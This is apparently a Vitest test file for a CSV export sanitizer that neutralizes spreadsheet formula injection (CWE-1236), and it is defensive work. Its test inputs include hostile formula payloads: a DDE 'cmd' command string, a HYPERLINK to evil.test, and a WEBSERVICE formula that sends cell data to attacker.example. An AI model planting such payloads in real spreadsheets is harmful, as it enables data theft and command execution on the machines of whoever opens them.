import { describe, it, expect } from 'vitest';
import { formatCsvCell, sanitizeCsvCell, serializeCsv } from './csvSafety';

describe('csvSafety (CWE-1236 formula neutralization)', () => {
  it('neutralizes direct formula-leading characters with a leading apostrophe', () => {
    expect(sanitizeCsvCell('=1+1')).toBe("'=1+1");
    expect(sanitizeCsvCell("=cmd|' /C calc'!A0")).toBe("'=cmd|' /C calc'!A0");
    expect(sanitizeCsvCell('+SUM(A1:A2)')).toBe("'+SUM(A1:A2)");
    expect(sanitizeCsvCell('-2+3')).toBe("'-2+3");
    expect(sanitizeCsvCell('@SUM(1+1)')).toBe("'@SUM(1+1)");
    expect(sanitizeCsvCell('\t=1+1')).toBe("'\t=1+1");
    expect(sanitizeCsvCell('\r=1+1')).toBe("'\r=1+1");
    expect(sanitizeCsvCell('\tplain')).toBe("'\tplain");
    expect(sanitizeCsvCell('\rplain')).toBe("'\rplain");
  });

  it('neutralizes formula triggers hidden behind leading whitespace or control chars', () => {
    expect(sanitizeCsvCell('   =HYPERLINK("https://evil.test")')).toBe(
      '\'   =HYPERLINK("https://evil.test")',
    );
    expect(sanitizeCsvCell('\n=1+1')).toBe("'\n=1+1");
    expect(sanitizeCsvCell('\u0000=1+1')).toBe("'\u0000=1+1");
    expect(sanitizeCsvCell('\u000b+cmd')).toBe("'\u000b+cmd");
    expect(sanitizeCsvCell('\ufeff@SUM(1,2)')).toBe("'\ufeff@SUM(1,2)");
    expect(sanitizeCsvCell(' \tplain')).toBe("' \tplain");
    expect(sanitizeCsvCell(' \rplain')).toBe("' \rplain");
    expect(sanitizeCsvCell('  -10')).toBe("'  -10");
  });

  it('leaves benign strings, numbers, and empty values intact', () => {
    expect(sanitizeCsvCell(null)).toBe('');
    expect(sanitizeCsvCell(undefined)).toBe('');
    expect(sanitizeCsvCell('')).toBe('');
    expect(sanitizeCsvCell('normal text')).toBe('normal text');
    expect(sanitizeCsvCell('a = b + c - d')).toBe('a = b + c - d');
    expect(sanitizeCsvCell('2026-11-27T00:00:00.000Z')).toBe('2026-11-27T00:00:00.000Z');
    expect(sanitizeCsvCell(42.5)).toBe('42.5');
    expect(sanitizeCsvCell(0)).toBe('0');
  });

  it('quotes cells containing commas, quotes, newlines, or carriage returns after sanitizing', () => {
    expect(formatCsvCell('=HYPERLINK("https://a.test","click")')).toBe(
      `"'=HYPERLINK(""https://a.test"",""click"")"`,
    );
    expect(formatCsvCell('hello, world')).toBe('"hello, world"');
    expect(formatCsvCell('line1\rline2')).toBe('"line1\rline2"');
    expect(formatCsvCell('\r=1+1')).toBe('"\'\r=1+1"');
    expect(formatCsvCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('serializes full CSV documents neutralizing both headers and row values', () => {
    const csv = serializeCsv(
      ['text', 'provider', 'composite'],
      [
        {
          text: '=WEBSERVICE("https://attacker.example/?d="&A1)',
          provider: '+mock',
          composite: 84.2,
        },
        {
          text: '  @SUM(1,2), safe',
          provider: 'openai',
          composite: 91,
        },
      ],
    );
    const lines = csv.split('\n');
    expect(lines[0]).toBe('text,provider,composite');
    expect(lines[1]).toBe(
      `"'=WEBSERVICE(""https://attacker.example/?d=""&A1)",'+mock,84.2`,
    );
    expect(lines[2]).toBe(`"'  @SUM(1,2), safe",openai,91`);
  });
});
